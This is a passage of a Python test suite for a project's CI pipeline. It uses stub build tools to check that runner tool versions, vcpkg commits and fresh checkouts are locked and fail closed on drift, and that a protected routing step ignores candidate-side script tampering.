        tool_root = root / "host-tools"
        cmake_root = tool_root / "cmake-root"
        cmake_module = cmake_root / "Modules/GoogleTest.cmake"
        cmake_module.parent.mkdir(parents=True)
        cmake_module.write_text(
            "# counter-suffixed GoogleTest fixture\n",
            encoding="utf-8",
        )
        module_digest = hashlib.sha256(cmake_module.read_bytes()).hexdigest()
        cmake_path = tool_root / "cmake"
        tool_log = root / "tool.log"
        cmake_path.write_text(
            f"#!{sys.executable}\n"
            "import json\n"
            "import os\n"
            "import sys\n"
            "with open(os.environ['CI_TEST_TOOL_LOG'], 'a', encoding='utf-8') as handle:\n"
            "    handle.write(json.dumps(sys.argv, separators=(',', ':')) + '\\n')\n"
            "if sys.argv[1:] == ['--version']:\n"
            "    print('cmake version ' + os.environ.get('CI_TEST_CMAKE_VERSION', '3.31.5'))\n"
            "elif sys.argv[1:] == ['--system-information']:\n"
            f"    print('CMAKE_ROOT \\\"{cmake_root}\\\"')\n"
            "else:\n"
            "    raise SystemExit(91)\n",
            encoding="utf-8",
        )
        cmake_path.chmod(0o755)
        clang_path = tool_root / "clang"
        clangxx_path = tool_root / "clang++"
        compiler_program = (
            f"#!{sys.executable}\n"
            "import json\n"
            "import os\n"
            "import stat\n"
            "import sys\n"
            "from pathlib import Path\n"
            "with open(os.environ['CI_TEST_TOOL_LOG'], 'a', encoding='utf-8') as handle:\n"
            "    handle.write(json.dumps(sys.argv, separators=(',', ':')) + '\\n')\n"
            "if sys.argv[1:] == ['--version']:\n"
            "    print('Homebrew clang version ' + os.environ.get('CI_TEST_COMPILER_VERSION', '18.1.8'))\n"
            "    raise SystemExit(0)\n"
            "if os.environ.get('CI_TEST_COMPILER_FAIL') == '1':\n"
            "    print('bounded fixture compile failure')\n"
            "    raise SystemExit(93)\n"
            "if '-o' not in sys.argv:\n"
            "    raise SystemExit(92)\n"
            "output = Path(sys.argv[sys.argv.index('-o') + 1])\n"
            "output.write_text('#!/usr/bin/env bash\\nexit 0\\n', encoding='utf-8')\n"
            "output.chmod(output.stat().st_mode | stat.S_IXUSR)\n"
        )
        clang_path.write_text(compiler_program, encoding="utf-8")
        clangxx_path.write_text(compiler_program, encoding="utf-8")
        clang_path.chmod(0o755)
        clangxx_path.chmod(0o755)

        commits = {
            DARWIN_STABLE_VERSION: "6d9d7df564a1ccdaa994e4ad39ccd4a32360867b",
            DARWIN_ROLLOUT_VERSION: "127402f1c75bb3d5ff6bce04b285faa4930a5aca",
        }
        approved_images = [
            {
                "cmake_gtest_module_sha256": module_digest,
                "cmake_path": str(cmake_path),
                "cmake_version": "3.31.5",
                "fuzz_c_compiler_path": str(clang_path),
                "fuzz_compiler_version": "18.1.8",
                "fuzz_cxx_compiler_path": str(clangxx_path),
                "image_version": version,
                "vcpkg_commit": commit,
            }
            for version, commit in sorted(commits.items())
        ]
        darwin_lock = {
            "approved_images": approved_images,
            "architecture": "arm64",
            "image_os": "macos15",
            "runner_label": "macos-15",
            "schema": "photospider-darwin-runner-lock-v2",
            "triplet": "arm64-osx",
        }
        (control_locks / "darwin-runner-lock.json").write_text(
            json.dumps(darwin_lock, sort_keys=True, indent=2) + "\n",
            encoding="utf-8",
        )
        binary_dir = root / "bin"
        binary_dir.mkdir()
        uname = binary_dir / "uname"
        uname.write_text(
            "#!/usr/bin/env bash\n"
            "[[ ${1:-} == -s ]] && { echo Darwin; exit 0; }\n"
            "[[ ${1:-} == -m ]] && { echo arm64; exit 0; }\n"
            "exit 1\n",
            encoding="utf-8",
        )
        uname.chmod(0o755)

        git_log = root / "git.log"
        git = binary_dir / "git"
        git.write_text(
            f"#!{sys.executable}\n"
            "import json\n"
            "import os\n"
            "import sys\n"
            "from pathlib import Path\n"
            "args = sys.argv[1:]\n"
            "with open(os.environ['CI_TEST_GIT_LOG'], 'a', encoding='utf-8') as handle:\n"
            "    handle.write(json.dumps(args, separators=(',', ':')) + '\\n')\n"
            "worktree = None\n"
            "index = 0\n"
            "while index < len(args):\n"
            "    if args[index] == '-C':\n"
            "        worktree = Path(args[index + 1])\n"
            "        index += 2\n"
            "    elif args[index] == '-c':\n"
            "        index += 2\n"
            "    elif args[index].startswith('-'):\n"
            "        index += 1\n"
            "    else:\n"
            "        break\n"
            "command = args[index] if index < len(args) else ''\n"
            "command_args = args[index + 1:]\n"
            "source = Path(os.environ['CI_TEST_VCPKG_SOURCE'])\n"
            "locked = os.environ['CI_TEST_LOCKED_COMMIT']\n"
            "if command == 'init':\n"
            "    target = Path(command_args[-1])\n"
            "    (target / '.git').mkdir(parents=True)\n"
            "elif command == 'cat-file':\n"
            "    raise SystemExit(0 if os.environ.get('CI_TEST_SOURCE_HAS_COMMIT', '1') == '1' else 1)\n"
            "elif command == 'checkout':\n"
            "    toolchain = worktree / 'scripts/buildsystems/vcpkg.cmake'\n"
            "    toolchain.parent.mkdir(parents=True)\n"
            "    toolchain.write_text('# locked fixture\\n', encoding='utf-8')\n"
            "    unsafe = os.environ.get('CI_TEST_UNSAFE_FRESH', '')\n"
            "    if unsafe == 'symlink':\n"
            "        (worktree / 'unsafe-link').symlink_to(source / 'tracked-dirty')\n"
            "    elif unsafe == 'fifo':\n"
            "        os.mkfifo(worktree / 'unsafe-fifo')\n"
            "    elif unsafe == 'residual':\n"
            "        (worktree / 'residual-state').write_text('unexpected\\n', encoding='utf-8')\n"
            "elif command == 'rev-parse':\n"
            "    print(os.environ.get('CI_TEST_FRESH_COMMIT', locked) if worktree != source else locked)\n"
            "elif command == 'status':\n"
            "    if worktree == source:\n"
            "        print(' M tracked-dirty')\n"
            "    elif os.environ.get('CI_TEST_UNSAFE_FRESH') == 'residual':\n"
            "        print('?? residual-state')\n"
            "elif command == 'diff' and worktree == source:\n"
            "    raise SystemExit(1)\n",
            encoding="utf-8",
        )
        git.chmod(0o755)

        vcpkg_source = root / "preinstalled-vcpkg"
        (vcpkg_source / ".git").mkdir(parents=True)
        (vcpkg_source / "tracked-dirty").write_text("dirty runner source\n", encoding="utf-8")
        vcpkg_log = root / "vcpkg.log"
        vcpkg = vcpkg_source / "vcpkg"
        vcpkg.write_text(
            "#!/usr/bin/env bash\n"
            "set -Eeuo pipefail\n"
            "{\n"
            "  printf 'executable=%s\\n' \"$0\"\n"
            "  printf 'root=%s\\n' \"${VCPKG_ROOT:-}\"\n"
            "  printf 'binary=%s\\n' \"${VCPKG_BINARY_SOURCES:-}\"\n"
            "  printf 'asset=%s\\n' \"${X_VCPKG_ASSET_SOURCES:-}\"\n"
            "  for argument in \"$@\"; do printf 'arg=%s\\n' \"$argument\"; done\n"
            "} > \"$CI_TEST_VCPKG_LOG\"\n",
            encoding="utf-8",
        )
        vcpkg.chmod(0o755)
        runner_temp = root / "runner-temp"
        runner_temp.mkdir()
        output = root / "cmake-args.txt"
        command_output = root / "cmake-command.txt"
        runner_identity_path = root / "darwin-runner-identity.json"
        selected = next(
            record
            for record in approved_images
            if record["image_version"] == image_version
        )
        runner_identity = {
            "architecture": "arm64",
            "cmake_gtest_module_sha256": selected[
                "cmake_gtest_module_sha256"
            ],
            "cmake_path": selected["cmake_path"],
            "cmake_version": selected["cmake_version"],
            "fuzz_c_compiler_path": selected["fuzz_c_compiler_path"],
            "fuzz_compiler_version": selected["fuzz_compiler_version"],
            "fuzz_cxx_compiler_path": selected["fuzz_cxx_compiler_path"],
            "image_os": "macos15",
            "image_version": image_version,
            "platform": "Darwin",
            "runner_label": "macos-15",
            "schema": "photospider-runner-runtime-identity-v1",
            "triplet": "arm64-osx",
            "vcpkg_commit": selected["vcpkg_commit"],
        }
        runner_identity_path.write_text(
            json.dumps(
                runner_identity,
                sort_keys=True,
                separators=(",", ":"),
            )
            + "\n",
            encoding="utf-8",
        )
        locked_commit = runner_identity["vcpkg_commit"]
        environment = {
            "PATH": f"{binary_dir}:{os.environ['PATH']}",
            "CI_PLATFORM_CMAKE_ARGS_FILE": str(output),
            "CI_PLATFORM_CMAKE_COMMAND_FILE": str(command_output),
            "CI_RUNNER_IDENTITY_FILE": str(runner_identity_path),
            "CI_RUNNER_TEMP": str(runner_temp),
            "CI_TEST_PREPARE_SCRIPT": str(
                control_scripts / "security_platform_prepare.sh"
            ),
            "CI_TEST_GIT_LOG": str(git_log),
            "CI_TEST_LOCKED_COMMIT": locked_commit,
            "CI_TEST_TOOL_LOG": str(tool_log),
            "CI_TEST_VCPKG_LOG": str(vcpkg_log),
            "CI_TEST_VCPKG_SOURCE": str(vcpkg_source),
            "VCPKG_INSTALLATION_ROOT": str(vcpkg_source),
        }
        return profile, environment, git_log, vcpkg_log, runner_temp, vcpkg_source

    def test_dirty_source_produces_fresh_clean_checkout_and_exact_install(self) -> None:
        """Use a dirty image source only as locked objects, then install fresh."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            profile, environment, git_log, vcpkg_log, runner_temp, source = (
                self._prepare_darwin_fixture(root)
            )
            run_command(
                "bash", environment["CI_TEST_PREPARE_SCRIPT"], profile,
                environment=environment,
            )
            arguments = (root / "cmake-args.txt").read_text(encoding="utf-8")
            self.assertIn("-DVCPKG_TARGET_TRIPLET=arm64-osx", arguments)
            self.assertIn(str(runner_temp), arguments)
            self.assertNotIn(str(source / "scripts/buildsystems/vcpkg.cmake"), arguments)
            identity = json.loads(
                Path(environment["CI_RUNNER_IDENTITY_FILE"]).read_text(
                    encoding="utf-8"
                )
            )
            self.assertEqual(
                (root / "cmake-command.txt").read_text(encoding="utf-8"),
                identity["cmake_path"] + "\n",
            )
            self.assertIn(
                f"-DCMAKE_C_COMPILER={identity['fuzz_c_compiler_path']}",
                arguments,
            )
            self.assertIn(
                f"-DCMAKE_CXX_COMPILER={identity['fuzz_cxx_compiler_path']}",
                arguments,
            )
            tool_calls = [
                json.loads(line)
                for line in Path(environment["CI_TEST_TOOL_LOG"])
                .read_text(encoding="utf-8")
                .splitlines()
            ]
            self.assertIn([identity["cmake_path"], "--version"], tool_calls)
            self.assertIn(
                [identity["cmake_path"], "--system-information"], tool_calls
            )
            compile_call = next(
                call
                for call in tool_calls
                if call[0] == identity["fuzz_cxx_compiler_path"]
                and "-fsanitize=fuzzer,address,undefined" in call
            )
            self.assertIn("-std=c++17", compile_call)

            install_lines = vcpkg_log.read_text(encoding="utf-8").splitlines()
            executable = next(line.removeprefix("executable=") for line in install_lines if line.startswith("executable="))
            fresh_root = next(line.removeprefix("root=") for line in install_lines if line.startswith("root="))
            self.assertEqual(executable, f"{fresh_root}/vcpkg")
            self.assertTrue(Path(fresh_root).is_relative_to(runner_temp.resolve()))
            self.assertNotEqual(executable, str(source / "vcpkg"))
            self.assertIn("binary=clear", install_lines)
            self.assertIn("asset=clear", install_lines)
            install_arguments = [line.removeprefix("arg=") for line in install_lines if line.startswith("arg=")]
            self.assertEqual(
                install_arguments,
                [
                    "install",
                    "--triplet",
                    "arm64-osx",
                    "--x-install-root",
                    f"{fresh_root}/installed",
                    "--clean-after-build",
                    "openssl",
                    "utf8proc",
                ],
            )
            git_calls = [json.loads(line) for line in git_log.read_text(encoding="utf-8").splitlines()]
            source_identity = str(source.resolve())
            self.assertTrue(any("cat-file" in call and source_identity in call for call in git_calls))
            self.assertFalse(any("diff" in call and source_identity in call for call in git_calls))
            self.assertFalse(any("status" in call and source_identity in call for call in git_calls))

            run_command(
                "bash", environment["CI_TEST_PREPARE_SCRIPT"], profile,
                environment={
                    **environment,
                    "ImageVersion": "stale",
                    "CI_PLATFORM_CMAKE_ARGS_FILE": str(root / "stale.txt"),
                },
            )
            self.assertTrue((root / "stale.txt").is_file())

    def test_darwin_tool_identity_and_combined_probe_fail_closed(self) -> None:
        """Reject CMake/module/compiler drift and a failed real fuzz probe.

        Returns:
            None after every bounded fixture fails before vcpkg installation
            for the exact mismatched retained tool boundary.

        Raises:
            AssertionError: The stage accepts a different CMake/module/LLVM
                identity or reports a failed combined sanitizer probe as usable.
        """
        cases = (
            (
                "cmake-version",
                {"CI_TEST_CMAKE_VERSION": "4.4.0"},
                False,
                "CMake version differs",
            ),
            (
                "cmake-module",
                {},
                True,
                "GoogleTest module differs",
            ),
            (
                "compiler-version",
                {"CI_TEST_COMPILER_VERSION": "17.0.0"},
                False,
                "compiler version differs",
            ),
            (
                "compile-link",
                {"CI_TEST_COMPILER_FAIL": "1"},
                False,
                "compile-link probe failed",
            ),
        )
        for label, override, mutate_module, diagnostic in cases:
            with self.subTest(tool_drift=label), tempfile.TemporaryDirectory() as text:
                root = Path(text)
                profile, environment, _, vcpkg_log, _, _ = (
                    self._prepare_darwin_fixture(root)
                )
                if mutate_module:
                    (root / "host-tools/cmake-root/Modules/GoogleTest.cmake").write_text(
                        "# drifted module\n", encoding="utf-8"
                    )
                failed = run_command(
                    "bash",
                    environment["CI_TEST_PREPARE_SCRIPT"],
                    profile,
                    environment={**environment, **override},
                    expect_success=False,
                )
                self.assertIn(diagnostic, failed.stderr)
                self.assertFalse(vcpkg_log.exists())
                if label == "compile-link":
                    self.assertTrue(
                        list(root.glob("darwin-fuzz-toolchain-compile-link.log"))
                    )

    def test_each_darwin_rollout_member_selects_only_its_mapped_commit(self) -> None:
        """Bind each approved image version to its unique retained vcpkg commit."""
        expected = {
            DARWIN_STABLE_VERSION: "6d9d7df564a1ccdaa994e4ad39ccd4a32360867b",
            DARWIN_ROLLOUT_VERSION: "127402f1c75bb3d5ff6bce04b285faa4930a5aca",
        }
        for index, (image_version, commit) in enumerate(expected.items()):
            with self.subTest(image_version=image_version), tempfile.TemporaryDirectory() as text:
                root = Path(text)
                profile, environment, git_log, _, _, _ = self._prepare_darwin_fixture(
                    root, image_version
                )
                environment["CI_PLATFORM_CMAKE_ARGS_FILE"] = str(
                    root / f"mapped-{index}.txt"
                )
                run_command(
                    "bash",
                    environment["CI_TEST_PREPARE_SCRIPT"],
                    profile,
                    environment=environment,
                )
                calls = [
                    json.loads(line)
                    for line in git_log.read_text(encoding="utf-8").splitlines()
                ]
                fetch = next(call for call in calls if "fetch" in call)
                self.assertIn(commit, fetch)

                identity_path = Path(environment["CI_RUNNER_IDENTITY_FILE"])
                identity = json.loads(identity_path.read_text(encoding="utf-8"))
                identity["vcpkg_commit"] = (
                    expected[DARWIN_ROLLOUT_VERSION]
                    if commit == expected[DARWIN_STABLE_VERSION]
                    else expected[DARWIN_STABLE_VERSION]
                )
                identity_path.write_text(
                    json.dumps(identity, sort_keys=True, separators=(",", ":")) + "\n",
                    encoding="utf-8",
                )
                failed = run_command(
                    "bash",
                    environment["CI_TEST_PREPARE_SCRIPT"],
                    profile,
                    environment={
                        **environment,
                        "CI_PLATFORM_CMAKE_ARGS_FILE": str(root / "crossed.txt"),
                    },
                    expect_success=False,
                )
                self.assertIn("differs from its approved lock member", failed.stderr)

    def test_fresh_checkout_rejects_commit_link_fifo_and_residual_state(self) -> None:
        """Fail closed for every fresh-checkout identity and filesystem drift."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            profile, environment, _, _, _, _ = self._prepare_darwin_fixture(root)
            cases = (
                ({"CI_TEST_FRESH_COMMIT": "2" * 40}, "differs from protected"),
                ({"CI_TEST_UNSAFE_FRESH": "symlink"}, "contains a link"),
                ({"CI_TEST_UNSAFE_FRESH": "fifo"}, "contains a special entry"),
                ({"CI_TEST_UNSAFE_FRESH": "residual"}, "contains residual or modified state"),
            )
            for index, (override, diagnostic) in enumerate(cases):
                with self.subTest(diagnostic=diagnostic):
                    failed = run_command(
                        "bash", environment["CI_TEST_PREPARE_SCRIPT"], profile,
                        environment={
                            **environment,
                            **override,
                            "CI_PLATFORM_CMAKE_ARGS_FILE": str(root / f"unsafe-{index}.txt"),
                        },
                        expect_success=False,
                    )
                    self.assertIn(diagnostic, failed.stderr)

    def test_missing_preinstalled_object_uses_only_explicit_official_source(self) -> None:
        """Fetch the exact commit from microsoft/vcpkg when local objects lack it."""
        with tempfile.TemporaryDirectory() as temporary_text:
            root = Path(temporary_text)
            profile, environment, git_log, _, _, _ = self._prepare_darwin_fixture(root)
            run_command(
                "bash", environment["CI_TEST_PREPARE_SCRIPT"], profile,
                environment={**environment, "CI_TEST_SOURCE_HAS_COMMIT": "0"},
            )
            calls = [json.loads(line) for line in git_log.read_text(encoding="utf-8").splitlines()]
            fetch = next(call for call in calls if "fetch" in call)
            self.assertIn("https://github.com/microsoft/vcpkg.git", fetch)
            self.assertIn(environment["CI_TEST_LOCKED_COMMIT"], fetch)

        workflow = (REPO_ROOT / ".github/workflows/ci-integration.yml").read_text(
            encoding="utf-8"
        )
        self.assertIn("CI_RUNNER_TEMP: ${{ runner.temp }}", workflow)
        self.assertNotIn("CI_DARWIN_VCPKG_INSTALLED:", workflow)

    def test_gtest_inventory_uses_canonicalized_actual_ctest_includes(self) -> None:
        """Accept CMake 3.31 counters and reject every other include identity.

        Returns:
            None after the candidate-owned helper accepts canonical counter
            names and rejects CMake hash names, foreign/duplicate/missing
            records, and target-counter drift.

        Raises:
            AssertionError: The protected CMake handoff can silently feed a
                naming convention that current-main's helper cannot prove.

        Note:
            Supporting newer hash-suffixed GoogleTest includes remains a
            candidate-owned follow-up. The protected stage intentionally pins
            the compatible CMake 3.31.5 module instead of broadening this
            product helper in the CI-only PR.
        """
        module = (REPO_ROOT / "cmake/PhotospiderCiInventory.cmake").as_posix()
        cases = (
            ("counter", ["alpha[1]", "beta[1]"], "1", None),
            (
                "hash",
                ["alpha_b8a0a976", "beta[1]"],
                "1",
                "canonical GoogleTest registration name",
            ),
            (
                "foreign",
                ["SOURCE:alpha[1]", "beta[1]"],
                "1",
                "outside the root binary directory",
            ),
            (
                "duplicate",
                ["alpha[1]", "alpha[1]", "beta[1]"],
                "1",
                "duplicates GoogleTest target alpha",
            ),
            (
                "missing",
                ["alpha[1]"],
                "1",
                "Registered GoogleTest target lacks a CTest include: beta",
            ),
            (
                "counter-drift",
                ["alpha[1]", "beta[1]"],
                "2",
                "registration counter does not match",
            ),
        )
        for label, include_names, alpha_counter, diagnostic in cases:
            with self.subTest(include_shape=label), tempfile.TemporaryDirectory() as temporary_text:
                root = Path(temporary_text)
                source = root / "source"
                build = root / "build"
                source.mkdir()
                (source / "main.cpp").write_text(
                    "int main() { return 0; }\n", encoding="utf-8"
                )
                create_commands: list[str] = []
                include_expressions: list[str] = []
                for include_name in sorted(set(include_names)):
                    if include_name.startswith("SOURCE:"):
                        basename = include_name.removeprefix("SOURCE:")
                        expression = f"${{CMAKE_SOURCE_DIR}}/{basename}_include.cmake"
                    else:
                        basename = include_name
                        expression = f"${{CMAKE_BINARY_DIR}}/{basename}_include.cmake"
                    create_commands.append(f'file(WRITE "{expression}" "")')
                for include_name in include_names:
                    if include_name.startswith("SOURCE:"):
                        basename = include_name.removeprefix("SOURCE:")
                        include_expressions.append(
                            f'"${{CMAKE_SOURCE_DIR}}/{basename}_include.cmake"'
                        )
                    else:
                        include_expressions.append(
                            f'"${{CMAKE_BINARY_DIR}}/{include_name}_include.cmake"'
                        )
                (source / "CMakeLists.txt").write_text(
                    "cmake_minimum_required(VERSION 3.16)\n"
                    "project(ci_inventory_contract LANGUAGES CXX)\n"
                    f'include("{module}")\n'
                    "add_executable(alpha main.cpp)\n"
                    "add_executable(beta main.cpp)\n"
                    f"set_property(TARGET alpha PROPERTY CTEST_DISCOVERED_TEST_COUNTER {alpha_counter})\n"
                    "set_property(TARGET beta PROPERTY CTEST_DISCOVERED_TEST_COUNTER 1)\n"
                    + "\n".join(create_commands)
                    + "\n"
                    "set_property(DIRECTORY PROPERTY TEST_INCLUDE_FILES\n"
                    f"  {' '.join(include_expressions)})\n"
                    "get_property(root_targets DIRECTORY PROPERTY BUILDSYSTEM_TARGETS)\n"
                    "get_property(ctest_includes DIRECTORY PROPERTY TEST_INCLUDE_FILES)\n"
                    "photospider_collect_registered_gtest_targets(\n"
                    "  registered ctest_includes root_targets \"${CMAKE_BINARY_DIR}\")\n"
                    + (
                        "if(NOT registered STREQUAL \"alpha;beta\")\n"
                        "  message(FATAL_ERROR \"unexpected registered target inventory: ${registered}\")\n"
                        "endif()\n"
                        if diagnostic is None
                        else ""
                    ),
                    encoding="utf-8",
                )
                completed = run_command(
                    "cmake", "-S", source, "-B", build,
                    expect_success=diagnostic is None,
                )
                if diagnostic is not None:
                    self.assertIn(diagnostic, completed.stderr)


class BuildSmokeRoutingContractTest(unittest.TestCase):
    """Validate disjoint producer, control, and dedicated smoke routing."""

    @staticmethod
    def _write_raw_route_bundle(
        raw_directory: Path,
        ctest_payload: bytes,
        *,
        candidate_commit: str,
        fallback_matrix_digest: str | None = None,
    ) -> str:
        """Write one canonical producer envelope around raw CTest/profile bytes.

        Args:
            raw_directory: Fresh directory owned by the isolated producer
                fixture.
            ctest_payload: Exact bytes returned by the real CTest JSON query.
            candidate_commit: Exact temporary candidate ``HEAD`` identity.
            fallback_matrix_digest: Protected fallback digest when the raw
                producer intentionally emits no versioned profile files.

        Returns:
            Matrix digest emitted by the complete versioned profile fixture.

        Note:
            The fixture deliberately creates only producer-owned raw bytes. It
            does not import or execute the candidate's routing helper or lock.
        """
        raw_directory.mkdir()
        (raw_directory / "ctest-info-v1.json").write_bytes(ctest_payload)
        if fallback_matrix_digest is None:
            matrix_digest = (
                ProfileReaderContractTest._write_complete_versioned_identity(
                    raw_directory
                )
            )
        else:
            if re.fullmatch(r"[0-9a-f]{64}", fallback_matrix_digest) is None:
                raise AssertionError("fallback matrix digest is malformed")
            matrix_digest = fallback_matrix_digest
        records = []
        names = ["ctest-info-v1.json"]
        if fallback_matrix_digest is None:
            names.extend(
                (
                    "build_profile_matrix_v1.tsv",
                    "build_profile_matrix_v1.tsv.sha256",
                    "ci_security_roles_v1.tsv",
                )
            )
        for name in sorted(names):
            content = (raw_directory / name).read_bytes()
            records.append(
                {
                    "path": name,
                    "sha256": hashlib.sha256(content).hexdigest(),
                    "size": len(content),
                }
            )
        manifest = {
            "candidate_commit": candidate_commit,
            "files": records,
            "image_digest": IMAGE_DIGEST,
            "profile": "default",
            "schema": "photospider-build-smoke-raw-inventory-v1",
            "workflow_commit": COMMIT_A,
        }
        (raw_directory / "raw-inventory.manifest.json").write_text(
            json.dumps(
                manifest,
                sort_keys=True,
                separators=(",", ":"),
                ensure_ascii=True,
            )
            + "\n",
            encoding="utf-8",
        )
        return matrix_digest

    @staticmethod
    def _run_protected_control(
        candidate_root: Path,
        candidate_commit: str,
        raw_directory: Path,
        output_directory: Path,
        github_output: Path,
        *,
        expect_success: bool,
    ) -> subprocess.CompletedProcess[str]:
        """Execute the real protected control CLI against disjoint fixture roots.

        Args:
            candidate_root: Isolated Git checkout whose code is not executed.
            candidate_commit: Exact candidate ``HEAD`` identity.
            raw_directory: Separate untrusted producer-envelope directory.
            output_directory: Fresh protected-control output path.
            github_output: Existing regular step-output fixture.
            expect_success: Whether ``run_command`` requires zero or nonzero.

        Returns:
            Captured completed process after expectation enforcement.

        Raises:
            AssertionError: The process result differs from ``expect_success``.

        Note:
            The protected helper and lock always come from ``REPO_ROOT`` at
            ``COMMIT_A``; no candidate pathname can select the evaluator.
        """
        return run_command(
            sys.executable,
            SCRIPTS / "build_smoke_route.py",
            "control",
            "--raw-dir",
            raw_directory,
            "--candidate-root",
            candidate_root,
            "--control-root",
            REPO_ROOT,
            "--output-dir",
            output_directory,
            "--candidate-commit",
            candidate_commit,
            "--workflow-commit",
            COMMIT_A,
            "--image-digest",
            IMAGE_DIGEST,
            "--profile",
            "default",
            "--github-output",
            github_output,
            expect_success=expect_success,
        )

    def test_fresh_protected_control_ignores_candidate_route_tampering(self) -> None:
        """Derive routes from real CTest bytes after candidate CMake tampers helpers.

        Returns:
            None after the real protected CLI creates and verifies the four
            canonical route partitions.

        Raises:
            AssertionError: Candidate CMake cannot generate the raw inventory,
                candidate route code executes, or protected control identity,
                coverage, output, or verification differs.
        """
        with tempfile.TemporaryDirectory() as temporary_text:
            temporary = Path(temporary_text)
            candidate = temporary / "candidate"
            build = temporary / "candidate-build"
            raw = temporary / "raw-inventory"
            output = temporary / "protected-output"
            marker = temporary / "candidate-route-executed"
            candidate.mkdir()
            (candidate / "ci/scripts").mkdir(parents=True)
            (candidate / "ci/locks").mkdir(parents=True)
            candidate_helper = candidate / "ci/scripts/build_smoke_route.py"
            candidate_lock = candidate / "ci/locks/build-smoke-routing.json"
            candidate_helper.write_text("# committed placeholder\n", encoding="utf-8")
            candidate_lock.write_text("{}\n", encoding="utf-8")
            test_names = (
                "DependencyDisabledInstallSmoke",
                "OpenExrDeepProviderOptionOffSmoke",
                "PublicHeaderSelfContainment",
                "StaticProductConsumerSmoke",
            )
            registrations = "\n".join(
                f"add_test(NAME {name} COMMAND \"${{CMAKE_COMMAND}}\" -E true)\n"
                f"set_tests_properties({name} PROPERTIES LABELS build-smoke)"
                for name in test_names
            )
            candidate_helper_text = (
                "#!/usr/bin/env python3\n"
                "from pathlib import Path\n"
                f"Path({str(marker)!r}).write_text('executed\\n', encoding='utf-8')\n"
                "raise SystemExit(97)\n"
            )
            cmake_source = (
                "cmake_minimum_required(VERSION 3.16)\n"
                "project(protected_route_fixture LANGUAGES NONE)\n"
                "enable_testing()\n"
                f"file(WRITE \"${{CMAKE_SOURCE_DIR}}/ci/scripts/build_smoke_route.py\" [==[{candidate_helper_text}]==])\n"
                "file(WRITE \"${CMAKE_SOURCE_DIR}/ci/locks/build-smoke-routing.json\" \"{\\\"schema\\\":\\\"candidate-owned-invalid\\\"}\\n\")\n"
                f"{registrations}\n"
            )
            (candidate / "CMakeLists.txt").write_text(
                cmake_source, encoding="utf-8"
            )
            run_command("git", "init", "-q", candidate)
            run_command("git", "-C", candidate, "config", "user.name", "CI Test")
            run_command(
                "git",
                "-C",
                candidate,
                "config",
                "user.email",
                "ci-test@example.invalid",
            )
            run_command("git", "-C", candidate, "add", ".")
            run_command(
                "git", "-C", candidate, "commit", "-q", "-m", "fixture"
            )
            candidate_commit = run_command(
                "git", "-C", candidate, "rev-parse", "HEAD"
            ).stdout.strip()

            run_command("cmake", "-S", candidate, "-B", build)
            self.assertIn("candidate-owned-invalid", candidate_lock.read_text())
            self.assertIn("candidate-route-executed", candidate_helper.read_text())
            ctest = run_command(
                "ctest", "--test-dir", build, "--show-only=json-v1"
            )
            matrix_digest = self._write_raw_route_bundle(
                raw,
                ctest.stdout.encode("utf-8"),
                candidate_commit=candidate_commit,
            )
            github_output = temporary / "github-output"
            github_output.write_text("", encoding="utf-8")
            self._run_protected_control(
                candidate,
                candidate_commit,
                raw,
                output,
                github_output,
                expect_success=True,
            )
            self.assertFalse(marker.exists())
            emitted = dict(
                line.split("=", 1)
                for line in github_output.read_text(encoding="utf-8").splitlines()
            )
            self.assertEqual(emitted["matrix_sha256"], matrix_digest)
            self.assertEqual(
                set(emitted),
                {
                    "build_smoke_matrix",
                    "dedicated_build_smoke_matrix",
                    "matrix_sha256",
                    "openexr_build_smoke_matrix",
                    "producer_build_smoke_matrix",
                    "route_sha256",
                },
            )
            routed_names = {
                entry["test"]
                for key in (
                    "build_smoke_matrix",
                    "dedicated_build_smoke_matrix",
                    "openexr_build_smoke_matrix",
                    "producer_build_smoke_matrix",
                )
                for entry in json.loads(emitted[key])["include"]
            }
            self.assertEqual(routed_names, set(test_names))
            run_command(
                sys.executable,
                SCRIPTS / "build_smoke_route.py",
                "verify-control",
                "--raw-dir",
                raw,
                "--manifest",
                output / "build-smoke-control.manifest.json",
                "--route-sha256",
                emitted["route_sha256"],
                "--candidate-commit",
                candidate_commit,
                "--workflow-commit",
                COMMIT_A,
                "--image-digest",
                IMAGE_DIGEST,
                "--profile",
                "default",
                "--matrix-sha256",
                matrix_digest,
            )
            producer_source = (SCRIPTS / "build_integrity.sh").read_text(
                encoding="utf-8"
            )
            self.assertNotIn("build_smoke_route.py", producer_source)
            self.assertNotIn("build-smoke-routing.json", producer_source)
            self.assertNotIn("build_smoke_inventory.py", producer_source)

    def test_fresh_control_fails_before_outputs_on_raw_inventory_drift(self) -> None:
        """Reject raw coverage, identity, matrix, member, and path-boundary drift.

        Returns:
            None after every malformed bundle leaves GitHub output unchanged
            and no canonical route manifest/matrix is created.

        Raises:
            AssertionError: A missing, duplicate, relabelled, undeclared,
                identity-forged, matrix-stale, or overlapping input reaches a
                route output.

        Note:
            The fixture uses a real temporary Git checkout while keeping all
            failure cases before artifact attestation or candidate execution.
        """
        base_tests = [
            {
                "backtrace": 1,
                "command": ["/usr/bin/true"],
                "name": name,
                "properties": [{"name": "LABELS", "value": ["build-smoke"]}],
            }
            for name in (
                "DependencyDisabledInstallSmoke",
                "OpenExrDeepProviderOptionOffSmoke",
                "PublicHeaderSelfContainment",
                "StaticProductConsumerSmoke",
            )
        ]
        with tempfile.TemporaryDirectory() as temporary_text:
            temporary = Path(temporary_text)
            candidate = temporary / "candidate"
            candidate.mkdir()
            run_command("git", "init", "-q", candidate)
            run_command("git", "-C", candidate, "config", "user.name", "CI Test")
            run_command(
                "git",
                "-C",
                candidate,
                "config",
                "user.email",
                "ci-test@example.invalid",
            )
            (candidate / "README").write_text("fixture\n", encoding="utf-8")
            run_command("git", "-C", candidate, "add", "README")
            run_command("git", "-C", candidate, "commit", "-q", "-m", "fixture")
            candidate_commit = run_command(
                "git", "-C", candidate, "rev-parse", "HEAD"
            ).stdout.strip()
            cases = {
                "missing-locked-smoke": base_tests[:-1],
                "duplicate-locked-smoke": base_tests + [dict(base_tests[-1])],
                "forged-label": [
                    *base_tests[:-1],
                    {
                        **base_tests[-1],
                        "properties": [{"name": "LABELS", "value": ["ordinary"]}],
                    },
                ],
            }
            for label, tests in cases.items():
                with self.subTest(case=label):
                    raw = temporary / f"raw-{label}"
                    output = temporary / f"output-{label}"
                    github_output = temporary / f"github-output-{label}"
                    github_output.write_text("sentinel\n", encoding="utf-8")
                    payload = {
